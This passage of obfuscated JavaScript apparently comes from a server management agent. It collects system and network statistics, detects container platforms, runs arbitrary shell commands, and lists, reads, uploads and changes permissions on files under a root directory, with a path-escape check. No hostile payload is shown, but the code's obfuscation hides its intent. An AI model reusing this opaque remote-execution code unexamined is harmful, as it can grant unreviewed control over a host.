            }, h = a[dS(0xc8c)](Date[dS(0x2a3)](), 0x3e8), i = a[dS(0x930)](h, this[dS(0x2b7)]), j = a[dS(0x930)](g['tx_bytes'], this['lastNetworkStats']['tx']), k = g[dS(0xc7f)] - this['lastNetworkStats']['rx'];
        this[dS(0x1ec)] += j, this[dS(0xcce)] += k, this[dS(0x6bf)] = {
            'tx': g[dS(0x89d)],
            'rx': g['rx_bytes']
        }, this[dS(0x2b7)] = h;
        const l = await a0u[dS(0xd9a)]();
        return {
            'cpu': { 'usage': Math[dS(0x926)](b[dS(0xbb5)]) },
            'ram': {
                'total': c[dS(0xb5f)],
                'used': c['active']
            },
            'swap': {
                'total': c[dS(0xd8d)],
                'used': c[dS(0x20a)]
            },
            'load': {
                'load1': a[dS(0xc8c)](Math['round'](f['avgLoad'] * 0x64), 0x64),
                'load5': a['ksLQF'](Math['round'](a[dS(0xcf4)](f[dS(0x268)], 0x64)), 0x64),
                'load15': a['OXSym'](Math[dS(0x926)](f[dS(0x268)] * 0x64), 0x64)
            },
            'disk': await this[dS(0x83e)](),
            'network': {
                'up': Math[dS(0x926)](a[dS(0x77a)](j, i)),
                'down': Math[dS(0x926)](k / i),
                'totalUp': this[dS(0x1ec)],
                'totalDown': this[dS(0xcce)]
            },
            'connections': await this['_getConnections'](),
            'uptime': a0p[dS(0x2bf)](),
            'process': l?.[dS(0xd94)] || 0x0,
            'message': ''
        };
    }
    async [a0c4(0x23b)]() {
        const dT = a0c4, a = {
                'aFmol': dT(0xb41),
                'QsWGp': 'Docker',
                'OIiEV': '/run/.containerenv',
                'BNhHU': 'Podman',
                'CKqPc': dT(0x1c0),
                'GfWeM': dT(0x1bc),
                'EZTQd': dT(0x4f6),
                'bIEth': dT(0xabe),
                'YnjVc': dT(0x81b),
                'wjKFX': dT(0x949),
                'BSYQe': dT(0x273),
                'UxzTv': '/docker/containers/',
                'xPHwE': dT(0xd3d),
                'nOGXe': dT(0x414),
                'rqceU': dT(0xb84),
                'XhXNO': dT(0x2a1),
                'WyIzV': 'container=lxc',
                'JsLmf': dT(0x52e),
                'RjFKc': 'QEMU',
                'OemBO': dT(0x82d)
            };
        try {
            if (a0l['existsSync'](a[dT(0x590)]))
                return a['QsWGp'];
            if (a0l[dT(0xc2f)](a[dT(0xbdb)]))
                return a[dT(0x3d0)];
            if (a0l[dT(0xc2f)](a[dT(0xbd0)])) {
                const b = a0l[dT(0xcda)](a[dT(0xbd0)], a[dT(0x35d)])[dT(0xc48)]();
                if (b[dT(0x38b)](dT(0x75c)) || b[dT(0x38b)](a[dT(0xaf6)]))
                    return a[dT(0xcc1)];
                else {
                    if (b[dT(0x38b)](dT(0x6fb)))
                        return a[dT(0x604)];
                    else {
                        if (b[dT(0x38b)](a['YnjVc']))
                            return a[dT(0x68a)];
                    }
                }
            }
            if (a0l[dT(0xc2f)](a[dT(0x58a)])) {
                const c = a0l[dT(0xcda)](a['BSYQe'], 'utf8');
                if (c['includes'](a[dT(0xbc5)]) || c[dT(0x38b)](a['xPHwE']))
                    return a['QsWGp'];
                else {
                    if (c[dT(0x38b)](a[dT(0x4e9)]) || c[dT(0x38b)](a[dT(0x610)]))
                        return dT(0xabe);
                }
            }
            if (a0l[dT(0xc2f)](a['XhXNO'])) {
                const d = a0l[dT(0xcda)](dT(0x2a1), dT(0x1bc));
                if (d[dT(0x38b)](a[dT(0x255)]))
                    return 'LXC';
            }
            if (a0l[dT(0xc2f)](a[dT(0x7c7)])) {
                const f = a0l[dT(0xcda)](a[dT(0x7c7)], dT(0x1bc));
                if (f['includes']('QEMU') || f[dT(0x38b)](dT(0xcba)))
                    return a[dT(0x525)];
            }
        } catch (g) {
        }
        return a[dT(0xd08)];
    }
    async [a0c4(0x83e)]() {
        const dU = a0c4, a = {
                'XiGny': function (b, c) {
                    return b > c;
                },
                'UwrqW': function (b, c) {
                    return b !== c;
                },
                'moYed': function (b, c) {
                    return b !== c;
                },
                'RkJYZ': dU(0xdc1),
                'PmcPR': dU(0x2ce)
            };
        try {
            const b = await a0u['fsSize'](), c = b[dU(0xaf5)](g => {
                    const dV = dU;
                    return a['XiGny'](g[dV(0x9e0)], 0x0) && a[dV(0x51f)](g[dV(0x221)], dV(0x8e3)) && a['moYed'](g[dV(0x221)], a[dV(0xc67)]) && g['fs'][dV(0x6ec)](a[dV(0x937)]);
                }), d = c[dU(0x857)]((g, h) => g + h[dU(0x9e0)], 0x0), f = c[dU(0x857)]((g, h) => g + h[dU(0x7b0)], 0x0);
            return {
                'total': d,
                'used': f
            };
        } catch {
            return {
                'total': 0x0,
                'used': 0x0
            };
        }
    }
    async [a0c4(0x30b)]() {
        const dW = a0c4;
        try {
            const a = await a0u[dW(0x889)](), b = a['filter'](d => d[dW(0x5a5)] === dW(0x428))[dW(0xcfc)], c = a['filter'](d => d['protocol'] === dW(0xb4a))[dW(0xcfc)];
            return {
                'tcp': b,
                'udp': c
            };
        } catch {
            return {
                'tcp': 0x0,
                'udp': 0x0
            };
        }
    }
}
class a0a1 {
    static async [a0c4(0x5ea)](a, b = {}) {
        const dX = a0c4, c = {
                'GlGHW': function (d, f) {
                    return d === f;
                },
                'rSTIt': dX(0x469),
                'hgSBp': function (d, f) {
                    return d(f);
                },
                'XYvNv': function (d, f) {
                    return d * f;
                },
                'uXErH': function (d, f) {
                    return d * f;
                }
            }, {
                cwd: cwd = process['cwd'](),
                env: env = {},
                timeout: timeout = a0P[dX(0x406)]
            } = b;
        return new Promise(d => {
            const dZ = dX, f = {
                    'JZuaj': function (i, j) {
                        const dY = a0b;
                        return c[dY(0x2b1)](i, j);
                    },
                    'oNChN': c[dZ(0x7f3)],
                    'fzxPE': function (i, j) {
                        const e0 = dZ;
                        return c[e0(0x7cb)](i, j);
                    }
                }, g = Date[dZ(0x2a3)](), h = a0r(a, {
                    'cwd': cwd,
                    'env': {
                        ...process.env,
                        ...env
                    },
                    'timeout': c[dZ(0xac5)](timeout, 0x3e8),
                    'maxBuffer': c['uXErH'](c[dZ(0x5be)](0xa, 0x400), 0x400)
                }, (i, j, k) => {
                    const e1 = dZ, l = Date['now']() - g, m = i && i['killed'] && i[e1(0x435)];
                    let n = j || '';
                    if (k)
                        n += k;
                    let o = 0x0;
                    if (i) {
                        if (m)
                            o = 0x7c;
                        else
                            f[e1(0x21a)](typeof i[e1(0x415)], f[e1(0xdaf)]) ? o = i[e1(0x415)] : o = -0x1;
                    }
                    f[e1(0x317)](d, {
                        'result': n,
                        'exitcode': o,
                        'timeout': m,
                        'cmd': a
                    });
                });
        });
    }
}
function a0a2(a) {
    const e2 = a0c4, b = {
            'dStyK': function (c, d) {
                return c === d;
            }
        };
    try {
        const c = a0l[e2(0xb1b)]['native'](a0o[e2(0xa50)](a0P['FILE_ROOT'])), d = a0o[e2(0xa50)](a);
        let f = d;
        while (!a0l[e2(0xc2f)](f)) {
            const j = a0o[e2(0x3b8)](f);
            if (b[e2(0x5d7)](j, f))
                return ![];
            f = j;
        }
        const g = a0l['realpathSync']['native'](f), h = a0o[e2(0x32d)](c, g);
        if (h[e2(0x6ec)]('..') || a0o[e2(0x86e)](h))
            return ![];
        const i = a0o[e2(0x32d)](f, d);
        if (i && (i['startsWith']('..') || a0o[e2(0x86e)](i)))
            return ![];
        return !![];
    } catch (k) {
        return ![];
    }
}
class a0a3 {
    static ['ZIP_MAX_ENTRIES'] = 0x4e20;
    static [a0c4(0x811)] = 0x200 * 0x400 * 0x400;
    static [a0c4(0xc03)] = 0x1f4;
    static ['_crcTable'] = null;
    static [a0c4(0xc42)](a) {
        const e3 = a0c4, b = {
                'ymfaw': function (g, h) {
                    return g < h;
                },
                'QxJZl': function (g, h) {
                    return g ^ h;
                },
                'tCLYl': function (g, h) {
                    return g >>> h;
                },
                'enLUI': function (g, h) {
                    return g >>> h;
                },
                'RUrJb': function (g, h) {
                    return g & h;
                },
                'CZMPx': function (g, h) {
                    return g >>> h;
                }
            };
        if (!a0a3[e3(0xc87)]) {
            const g = new Int32Array(0x100);
            for (let h = 0x0; b['ymfaw'](h, 0x100); h++) {
                let j = h;
                for (let l = 0x0; b[e3(0x401)](l, 0x8); l++)
                    j = j & 0x1 ? b[e3(0x44b)](0xedb88320, b[e3(0xa3f)](j, 0x1)) : b[e3(0xa3f)](j, 0x1);
                g[h] = j;
            }
            a0a3[e3(0xc87)] = g;
        }
        const d = a0a3['_crcTable'];
        let f = -0x1;
        for (let m = 0x0; m < a['length']; m++)
            f = b['enLUI'](f, 0x8) ^ d[b[e3(0x9ba)](f ^ a[m], 0xff)];
        return b[e3(0xd2c)](f ^ -0x1, 0x0);
    }
    static [a0c4(0xbf1)](a) {
        const e4 = a0c4, b = {
                'dghxm': function (g, h) {
                    return g & h;
                },
                'veeiA': function (g, h) {
                    return g | h;
                },
                'ZSvLv': function (g, h) {
                    return g << h;
                },
                'Ieysk': function (g, h) {
                    return g << h;
                },
                'ZjCoW': function (g, h) {
                    return g >> h;
                },
                'rxKnX': function (g, h) {
                    return g | h;
                },
                'gvwPK': function (g, h) {
                    return g - h;
                },
                'TeNyE': function (g, h) {
                    return g << h;
                },
                'RCggh': function (g, h) {
                    return g + h;
                }
            }, c = b['dghxm'](b['veeiA'](b[e4(0x96b)](b['ZSvLv'](a['getHours'](), 0xb), b[e4(0x89f)](a[e4(0x873)](), 0x5)), b['ZjCoW'](a[e4(0x9f1)](), 0x1)), 0xffff), f = b[e4(0x877)](b[e4(0x1bd)](b[e4(0x96b)](b[e4(0xa2e)](b[e4(0x398)](a[e4(0x6de)](), 0x7bc), 0x9), b[e4(0x6a5)](b[e4(0x8e5)](a[e4(0x3d8)](), 0x1), 0x5)), a['getDate']()), 0xffff);
        return {
            'time': c,
            'date': f
        };
    }
    static ['openWriter'](a) {
        const e5 = a0c4, b = {
                'wawOH': function (i, j) {
                    return i < j;
                },
                'xtYnz': function (i, j) {
                    return i - j;
                },
                'gdUbR': function (i, j) {
                    return i >= j;
                },
                'osDCX': e5(0x1bc),
                'zVBgI': function (i, j) {
                    return i > j;
                },
                'gDUzP': function (i, j) {
                    return i(j);
                },
                'xNGyM': function (i, j) {
                    return i(j);
                },
                'GJDEr': function (i, j) {
                    return i + j;
                },
                'jLCOh': function (i, j) {
                    return i + j;
                },
                'lobdu': function (i, j) {
                    return i(j);
                },
                'nWKXX': function (i, j) {
                    return i(j);
                }
            }, c = a0l[e5(0x45b)](a, 'w'), d = [];
        let f = 0x0, g = 0x0;
        const h = i => {
            const e6 = e5;
            let j = 0x0;
            while (b['wawOH'](j, i['length']))
                j += a0l['writeSync'](c, i, j, b[e6(0x75f)](i['length'], j));
        };
        return {
            'add'(i, j, k, l = ![]) {
                const e7 = e5;
                if (b[e7(0xcbb)](g, a0a3[e7(0x29b)]))
                    return ![];
                const m = Buffer['from'](i, b[e7(0x2d9)]);
                j = j || Buffer[e7(0x9b5)](0x0);
                const n = l ? 0x0 : a0a3[e7(0xc42)](j);
                let o = 0x0, p = j;
                if (!l && b[e7(0x44d)](j[e7(0xcfc)], 0x0)) {
                    const u = a0n['deflateRawSync'](j, { 'level': 0x6 });
                    b[e7(0x943)](u[e7(0xcfc)], j[e7(0xcfc)]) && (o = 0x8, p = u);
                }
                const {
                        time: q,
                        date: r
                    } = a0a3[e7(0xbf1)](k || new Date()), s = Buffer['alloc'](0x1e);
                s[e7(0x803)](0x4034b50, 0x0), s[e7(0x899)](0x14, 0x4), s['writeUInt16LE'](0x800, 0x6), s[e7(0x899)](o, 0x8), s[e7(0x899)](q, 0xa), s[e7(0x899)](r, 0xc), s['writeUInt32LE'](n, 0xe), s[e7(0x803)](p[e7(0xcfc)], 0x12), s['writeUInt32LE'](j[e7(0xcfc)], 0x16), s[e7(0x899)](m[e7(0xcfc)], 0x1a), s[e7(0x899)](0x0, 0x1c), b[e7(0x866)](h, s), b[e7(0x302)](h, m), h(p);
                const t = Buffer['alloc'](0x2e);
                return t[e7(0x803)](0x2014b50, 0x0), t[e7(0x899)](0x14, 0x4), t[e7(0x899)](0x14, 0x6), t[e7(0x899)](0x800, 0x8), t[e7(0x899)](o, 0xa), t[e7(0x899)](q, 0xc), t[e7(0x899)](r, 0xe), t[e7(0x803)](n, 0x10), t[e7(0x803)](p[e7(0xcfc)], 0x14), t[e7(0x803)](j[e7(0xcfc)], 0x18), t[e7(0x899)](m[e7(0xcfc)], 0x1c), t['writeUInt16LE'](0x0, 0x1e), t[e7(0x899)](0x0, 0x20), t[e7(0x899)](0x0, 0x22), t[e7(0x899)](0x0, 0x24), t[e7(0x803)](l ? 0x10 : 0x0, 0x26), t[e7(0x803)](f, 0x2a), d[e7(0x21f)](t, m), f += b[e7(0x2c2)](b[e7(0x4fb)](0x1e, m[e7(0xcfc)]), p[e7(0xcfc)]), g++, !![];
            },
            'close'() {
                const e8 = e5, i = Buffer[e8(0x6ef)](d), j = Buffer['alloc'](0x16);
                return j[e8(0x803)](0x6054b50, 0x0), j['writeUInt16LE'](0x0, 0x4), j[e8(0x899)](0x0, 0x6), j[e8(0x899)](g, 0x8), j['writeUInt16LE'](g, 0xa), j[e8(0x803)](i['length'], 0xc), j[e8(0x803)](f, 0x10), j[e8(0x899)](0x0, 0x14), b[e8(0x37e)](h, i), b['nWKXX'](h, j), a0l[e8(0x372)](c), g;
            }
        };
    }
    static ['parse'](a) {
        const e9 = a0c4, b = {
                'CavUs': function (n, o) {
                    return n - o;
                },
                'EoIVV': function (n, o) {
                    return n + o;
                },
                'MlgQF': function (n, o) {
                    return n >= o;
                },
                'LuFev': function (n, o) {
                    return n === o;
                },
                'ZTBnh': 'Not\x20a\x20zip\x20file',
                'nAVVN': function (n, o) {
                    return n + o;
                },
                'rxSdd': function (n, o) {
                    return n !== o;
                },
                'Kufjk': function (n, o) {
                    return n + o;
                },
                'Bobgl': function (n, o) {
                    return n + o;
                },
                'WORdy': function (n, o) {
                    return n + o;
                },
                'CcJLh': function (n, o) {
                    return n + o;
                },
                'UvaAB': function (n, o) {
                    return n + o;
                },
                'HeqMU': e9(0x1bc),
                'YrAAH': function (n, o) {
                    return n + o;
                },
                'DWGum': function (n, o) {
                    return n + o;
                },
                'GFSbe': function (n, o) {
                    return n & o;
                },
                'qWdff': function (n, o) {
                    return n & o;
                },
                'lFDvA': function (n, o) {
                    return n + o;
                }
            }, c = a0l['readFileSync'](a);
        let d = -0x1;
        const f = Math[e9(0x23e)](0x0, b['CavUs'](c[e9(0xcfc)], b[e9(0xce0)](0xffff, 0x16)));
        for (let n = c[e9(0xcfc)] - 0x16; b[e9(0x332)](n, f); n--) {
            if (b['LuFev'](c[e9(0xb4d)](n), 0x6054b50)) {
                d = n;
                break;
            }
        }
        if (d < 0x0)
            throw new Error(b['ZTBnh']);
        const g = c[e9(0xce2)](d + 0xa), h = c['readUInt32LE'](b[e9(0xce0)](d, 0xc)), j = c['readUInt32LE'](b[e9(0xa94)](d, 0x10)), k = [];
        let l = j;
        const m = b[e9(0xa94)](j, h);
        for (let o = 0x0; o < g && l + 0x2e <= m; o++) {
            if (b[e9(0xae7)](c[e9(0xb4d)](l), 0x2014b50))
                break;
            const q = c[e9(0xce2)](b['Kufjk'](l, 0x8)), r = c['readUInt16LE'](b[e9(0xcbe)](l, 0xa)), s = c[e9(0xb4d)](b[e9(0xcbe)](l, 0x10)), t = c['readUInt32LE'](l + 0x14), u = c[e9(0xb4d)](l + 0x18), v = c[e9(0xce2)](b[e9(0xcbe)](l, 0x1c)), w = c['readUInt16LE'](l + 0x1e), x = c[e9(0xce2)](l + 0x20), y = c[e9(0xb4d)](b['WORdy'](l, 0x26)), z = c[e9(0xb4d)](l + 0x2a), A = c[e9(0xa40)](b[e9(0xc04)](l, 0x2e), b[e9(0x370)](l + 0x2e, v))[e9(0xa3c)](b['HeqMU']);
            l += b[e9(0xa42)](b[e9(0xce0)](b[e9(0x347)](0x2e, v), w), x);
            const B = {
                'name': A,
                'isDir': A[e9(0xd23)]('/') || b[e9(0xae7)](b['GFSbe'](y, 0x10), 0x0),
                'method': r,
                'crc': s,
                'size': u,
                'compressedSize': t,
                'encrypted': b[e9(0xae7)](b[e9(0x5ab)](q, 0x1), 0x0),
                'zip64': b[e9(0x654)](t, 0xffffffff) || b['LuFev'](u, 0xffffffff) || b[e9(0x654)](z, 0xffffffff),
                'data': null
            };
            if (!B[e9(0xbe7)] && !B[e9(0x5b1)] && !B[e9(0x27c)]) {
                if (b[e9(0xb46)](z, 0x1e) <= c[e9(0xcfc)] && b[e9(0x654)](c[e9(0xb4d)](z), 0x4034b50)) {
                    const C = c[e9(0xce2)](b[e9(0xaf8)](z, 0x1a)), D = c[e9(0xce2)](z + 0x1c), E = b['YrAAH'](b['CcJLh'](z, 0x1e), C) + D;
                    b[e9(0x370)](E, t) <= c[e9(0xcfc)] && (B[e9(0x369)] = c[e9(0xa40)](E, E + t));
                }
            }
            k[e9(0x21f)](B);
        }
        return k;
    }
    static [a0c4(0x992)](a) {
        const ea = a0c4, b = {
                'mQUcG': function (c, d) {
                    return c === d;
                },
                'uUHzG': function (c, d) {
                    return c === d;
                }
            };
        if (b[ea(0xd25)](a[ea(0xaf0)], 0x0))
            return a[ea(0x369)];
        if (b['uUHzG'](a[ea(0xaf0)], 0x8))
            return a0n[ea(0x8be)](a[ea(0x369)]);
        throw new Error(ea(0xc6b) + a[ea(0xaf0)]);
    }
}
class a0a4 {
    static async [a0c4(0xd0b)](a, b = ![]) {
        const eb = a0c4, c = {
                'kSdiK': eb(0xd92),
                'vXlXl': function (h, i) {
                    return h & i;
                },
                'PCIBQ': function (h, i) {
                    return h(i);
                },
                'jTCPP': eb(0x420)
            }, d = a0o[eb(0xa50)](a0P[eb(0x37b)], a || '.');
        if (!c[eb(0x68c)](a0a2, d))
            throw new Error(c[eb(0x9fb)]);
        if (!a0l[eb(0xc2f)](d))
            throw new Error(eb(0xc3c));
        const f = [], g = h => {
                const ec = eb, i = a0l[ec(0x2d8)](h);
                for (const j of i) {
                    const k = a0o['join'](h, j), l = a0l[ec(0x4c6)](k), m = new a0L();
                    m[ec(0x4c7)] = j, m[ec(0x5b0)] = a0o[ec(0x32d)](a0P[ec(0x37b)], k), m[ec(0x221)] = l['isDirectory']() ? ec(0x22c) : c[ec(0xb29)], m['size'] = l[ec(0x9e0)], m[ec(0x1d8)] = l['mtime'][ec(0xb63)](), m['mode'] = this[ec(0x7ea)](l['mode'], l['isDirectory']()), m[ec(0xa17)] = '0o' + c[ec(0x5b7)](l[ec(0xa9a)], 0x1ff)[ec(0xa3c)](0x8), m[ec(0x246)] = l[ec(0x386)] + ':' + l['gid'], f[ec(0x21f)](m), b && l[ec(0x39a)]() && c[ec(0x68c)](g, k);
                }
            };
        return g(d), f;
    }
    static async ['getFilePermissions'](a) {
        const ed = a0c4, b = {
                'onDnV': function (d, f) {
                    return d(f);
                },
                'OkjSf': function (d, f) {
                    return d & f;
                },
                'AgIdc': ed(0x22c)
            }, c = [];
        for (const d of a) {
            const f = a0o[ed(0xa50)](a0P[ed(0x37b)], d);
            if (!b[ed(0x5c1)](a0a2, f))
                continue;
            try {
                const g = a0l[ed(0x4c6)](f), h = this['_checkAccess'](f, a0l[ed(0xbd2)][ed(0xb69)]), i = this[ed(0x6e4)](f, a0l[ed(0xbd2)]['W_OK']), j = this['_checkAccess'](f, a0l[ed(0xbd2)]['X_OK']), k = new a0M();
                k[ed(0x5b0)] = a0o[ed(0x32d)](a0P[ed(0x37b)], f), k[ed(0x4c7)] = a0o['basename'](f), k[ed(0xa9a)] = this[ed(0x7ea)](g['mode'], g['isDirectory']()), k['mode_octal'] = '0o' + b[ed(0xdbb)](g[ed(0xa9a)], 0x1ff)[ed(0xa3c)](0x8), k[ed(0x221)] = g['isDirectory']() ? b['AgIdc'] : 'file', k[ed(0xc44)] = h, k[ed(0x466)] = i, k['executable'] = j, c[ed(0x21f)](k);
            } catch (l) {
            }
        }
        return c;
    }
    static ['_checkAccess'](a, b) {
        const ee = a0c4;
        try {
            return a0l[ee(0x647)](a, b), !![];
        } catch {
            return ![];
        }
    }
    static ['_parseMode'](a) {
        const ef = a0c4, b = {
                'HRiLN': function (c, d) {
                    return c === d;
                },
                'LuajK': ef(0x469),
                'MxfVg': 'string',
                'yfIIR': ef(0x8d6)
            };
        if (b[ef(0xd66)](typeof a, b[ef(0x690)]))
            return a;
        if (typeof a === b['MxfVg']) {
            const c = a[ef(0x7e4)]();
            if (/^[0-7]{3,4}$/[ef(0x1d0)](c))
                return parseInt(c, 0x8);
        }
        throw new Error(b['yfIIR']);
    }
    static ['_formatMode'](a, b) {
        const eg = a0c4, c = b ? 'd' : '-', d = [
                'r',
                'w',
                'x'
            ], f = (a & 0x1ff)['toString'](0x8)[eg(0xaba)](0x3, '0');
        let g = c;
        for (const h of f) {
            const i = parseInt(h, 0xa);
            g += d['map']((j, k) => i & 0x4 >> k ? j : '-')['join']('');
        }
        return g;
    }
    static async [a0c4(0x225)](a, b = ![]) {
        const eh = a0c4, c = {
                'stTWZ': function (g, h) {
                    return g(h);
                },
                'ZhULS': function (g, h) {
                    return g(h);
                },
                'VvBPF': 'access_denied',
                'FykQw': function (g, h) {
                    return g(h);
                },
                'fQiYN': eh(0xbb0)
            }, d = [];
        for (const [g, h] of Object[eh(0x90c)](a)) {
            const i = a0o[eh(0xa50)](a0P[eh(0x37b)], g);
            if (!c['stTWZ'](a0a2, i)) {
                d['push']({
                    'path': g,
                    'requested': c['ZhULS'](String, h),
                    'applied': '',
                    'mode_octal': '',
                    'status': c[eh(0xb87)]
                });
                continue;
            }
            try {
                const j = this[eh(0x808)](h), k = m => {
                        const ei = eh;
                        a0l[ei(0x396)](m, j);
                    };
                if (b && a0l[eh(0xc2f)](i) && a0l['statSync'](i)[eh(0x39a)]()) {
                    const m = n => {
                        const ej = eh;
                        c[ej(0x535)](k, n);
                        const o = a0l[ej(0x2d8)](n);
                        for (const p of o) {
                            const q = a0o[ej(0x6e5)](n, p);
                            a0l[ej(0x4c6)](q)[ej(0x39a)]() ? m(q) : k(q);
                        }
                    };
                    c['stTWZ'](m, i);
                } else
                    c[eh(0xbf2)](k, i);
                const l = j[eh(0xa3c)](0x8);
                d[eh(0x21f)]({
                    'path': g,
                    'requested': c[eh(0xbf2)](String, h),
                    'applied': l,
                    'mode_octal': '0o' + l,
                    'status': 'ok'
                });
            } catch (n) {
                d[eh(0x21f)]({
                    'path': g,
                    'requested': String(h),
                    'applied': '',
                    'mode_octal': '',
                    'status': c[eh(0xae1)],
                    'message': n[eh(0x1f1)]
                });
            }
        }
        const f = d['filter'](o => o[eh(0x8ab)] === 'ok')['length'];
        return {
            'status': 'ok',
            'total': d[eh(0xcfc)],
            'success': f,
            'results': d
        };
    }
    static async [a0c4(0x1db)](a) {
        const ek = a0c4, b = {
                'gyBwr': function (h, i) {
                    return h(i);
                },
                'ILtHG': 'Access\x20denied:\x20path\x20outside\x20root',
                'gYSXc': function (h, i) {
                    return h > i;
                },
                'ZkLcC': function (h, i) {
                    return h * i;
                },
                'ItgSZ': ek(0x1bc),
                'rmgNC': ek(0xbba)
            }, c = a0o[ek(0xa50)](a0P[ek(0x37b)], a);
        if (!b[ek(0x309)](a0a2, c))
            throw new Error(b[ek(0x89a)]);
        const d = a0l[ek(0x4c6)](c);
        if (b['gYSXc'](d[ek(0x9e0)], b[ek(0x352)](0x400, 0x400)))
            throw new Error('File\x20too\x20large');
        const f = a0l['readFileSync'](c), g = this[ek(0x28b)](f);
        return {
            'status': 'ok',
            'path': a0o['relative'](a0P[ek(0x37b)], c),
            'content': g ? a0w[ek(0x254)](f) : f[ek(0xa3c)](b['ItgSZ']),
            'encoding': g ? ek(0x7be) : b[ek(0x46f)],
            'is_binary': g,
            'size': d[ek(0x9e0)]
        };
    }
    static ['_isBinary'](a) {
        const el = a0c4, b = {
                'VptEh': function (c, d) {
                    return c === d;
                }
            };
        if (!a || b[el(0x7b3)](a[el(0xcfc)], 0x0))
            return ![];
        for (let c = 0x0; c < Math[el(0x61d)](a[el(0xcfc)], 0x200); c++) {
            if (b[el(0x7b3)](a[c], 0x0))
                return !![];
        }
        return ![];
    }
    static async [a0c4(0x6ea)](a, b, c, d = null, f = null) {
        const em = a0c4, g = {
                'eHHMo': function (l, m) {
                    return l(m);
                },
                'Wqmpb': em(0x420),
                'RXZRy': 'File\x20too\x20large',
                'DNfuE': function (l, m) {
                    return l !== m;
                },
                'FEbgx': function (l, m) {
                    return l(m);
                },
                'CyzGo': em(0xa49),
                'cTzJm': em(0x67a),
                'PDkhl': function (l, m) {
                    return l === m;
                }
            }, h = a0o[em(0xa50)](a0P['FILE_ROOT'], a);
        let j = h;
        b && (j = a0o['join'](h, b));
        if (!g[em(0x56f)](a0a2, j))
            throw new Error(g['Wqmpb']);
        !a0l['existsSync'](a0o[em(0x3b8)](j)) && a0l[em(0xb8d)](a0o[em(0x3b8)](j), { 'recursive': !![] });
        const k = a0w[em(0x6eb)](c);
        if (k['length'] > a0P[em(0xae2)])
            throw new Error(g[em(0x427)]);
        if (g[em(0x7cf)](d, null) && g[em(0x7cf)](f, null)) {
            const l = g[em(0x56f)](Number, d), m = g['FEbgx'](Number, f);
            if (Number['isNaN'](l) || Number['isNaN'](m))
                throw new Error(g[em(0x840)]);
            const n = a0o[em(0x6e5)](a0o[em(0x3b8)](j), g[em(0x47b)], a0o[em(0xda0)](j));
            !a0l[em(0xc2f)](n) && a0l[em(0xb8d)](n, { 'recursive': !![] });
            const o = a0o[em(0x6e5)](n, 'chunk_' + l);
            a0l['writeFileSync'](o, k);
            const p = a0l['readdirSync'](n)['filter'](s => s[em(0x6ec)](em(0x25b))), q = p[em(0xcfc)], r = g[em(0x7df)](q, m);
            if (r) {
                const s = a0l[em(0x23f)](j);
                for (let u = 0x0; u < m; u++) {
                    const v = a0o['join'](n, em(0x25b) + u);
                    if (!a0l['existsSync'](v)) {
                        s['close']();
                        throw new Error(em(0x259) + u);
                    }
                    s['write'](a0l[em(0xcda)](v));
                }
                s[em(0xb3a)]();
                const t = a0o[em(0x3b8)](n);
                a0l[em(0x1f3)](n, {
                    'recursive': !![],
                    'force': !![]
                });
                try {
                    a0l[em(0x77f)](t);
                } catch (w) {
                }
            }
            return {
                'status': 'ok',
                'path': a0o[em(0x32d)](a0P[em(0x37b)], j),
                'received': q,
                'total': m,
                'chunked': !![]
            };
        }
        return a0l[em(0x7fe)](j, k), {
            'status': 'ok',
            'path': a0o[em(0x32d)](a0P['FILE_ROOT'], j),
            'received': k['length'],
            'total': k[em(0xcfc)],
            'chunked': ![]
        };
    }
    static async ['uploadFileRaw'](a, b, c, d = null, f = null) {
        const en = a0c4, g = {
                'UdAIL': en(0x420),
                'dJNLI': function (k, l) {
                    return k > l;
                },
                'BMNPM': function (k, l) {
                    return k !== l;
                },
                'qvexu': function (k, l) {
                    return k !== l;
                },
                'FwPTe': function (k, l) {
                    return k(l);
                },
                'XaRMe': function (k, l) {
                    return k(l);
                },
                'HHTKu': 'chunk_id\x20and\x20total_chunks\x20must\x20be\x20numeric',
                'Qsqia': en(0x67a),
                'zgxdd': function (k, l) {
                    return k === l;
                },
                'jwCrn': function (k, l) {
                    return k < l;
                },
                'NXGLx': en(0x496),
                'dBHqT': 'File\x20uploaded\x20successfully.'
            }, h = a0o[en(0xa50)](a0P['FILE_ROOT'], a || '.');
        let j = h;
        b && (j = a0o['join'](h, b));
        if (!a0a2(j))
            throw new Error(g['UdAIL']);
        !a0l[en(0xc2f)](a0o[en(0x3b8)](j)) && a0l[en(0xb8d)](a0o[en(0x3b8)](j), { 'recursive': !![] });
        if (g['dJNLI'](c[en(0xcfc)], a0P[en(0xae2)]))
            throw new Error(en(0x80d));
        if (g[en(0x76f)](d, null) && g['qvexu'](f, null)) {
            const k = g[en(0x9a7)](Number, d), l = g['XaRMe'](Number, f);
            if (Number[en(0xb51)](k) || Number[en(0xb51)](l))
                throw new Error(g[en(0xa13)]);
            const m = a0o[en(0x6e5)](a0o[en(0x3b8)](j), g['Qsqia'], a0o['basename'](j));
            !a0l[en(0xc2f)](m) && a0l[en(0xb8d)](m, { 'recursive': !![] });
            const n = a0o['join'](m, en(0x25b) + k);
            a0l[en(0x7fe)](n, c);
            const o = a0l[en(0x2d8)](m)[en(0xaf5)](r => r['startsWith'](en(0x25b))), p = o[en(0xcfc)], q = g['zgxdd'](p, l);
            if (q) {
                const r = [];
                for (let t = 0x0; g[en(0x2f0)](t, l); t++) {
                    const u = a0o['join'](m, en(0x25b) + t);
                    if (!a0l[en(0xc2f)](u))
                        throw new Error(en(0x259) + t);
                    r[en(0x21f)](a0l[en(0xcda)](u));
                }
                a0l[en(0x7fe)](j, Buffer[en(0x6ef)](r));
                const s = a0o[en(0x3b8)](m);
                a0l[en(0x1f3)](m, {
                    'recursive': !![],
                    'force': !![]
                });
                try {
                    a0l[en(0x77f)](s);
                } catch (v) {
                }
                return {
                    'status': 'ok',
                    'path': a0o['relative'](a0P[en(0x37b)], j),
                    'chunk_id': k,
                    'completed': !![],
                    'message': g[en(0xc11)]
                };
            }
            return {
                'status': 'ok',
                'path': a0o[en(0x32d)](a0P[en(0x37b)], j),
                'chunk_id': k,
                'completed': ![],
                'message': 'Chunk\x20' + k + en(0xd0f)
            };
        }
        return a0l[en(0x7fe)](j, c), {
            'status': 'ok',
            'path': a0o[en(0x32d)](a0P[en(0x37b)], j),
            'chunk_id': 0x0,
            'completed': !![],
            'message': g[en(0x22a)]
        };
    }
    static async [a0c4(0x541)](a) {
        const eo = a0c4, b = { 'OueUe': eo(0x5c4) }, c = a0o[eo(0xa50)](a0P[eo(0x37b)], a);
        if (!a0a2(c))
            throw new Error(eo(0x420));
        if (!a0l['existsSync'](c))
            throw new Error(b['OueUe']);
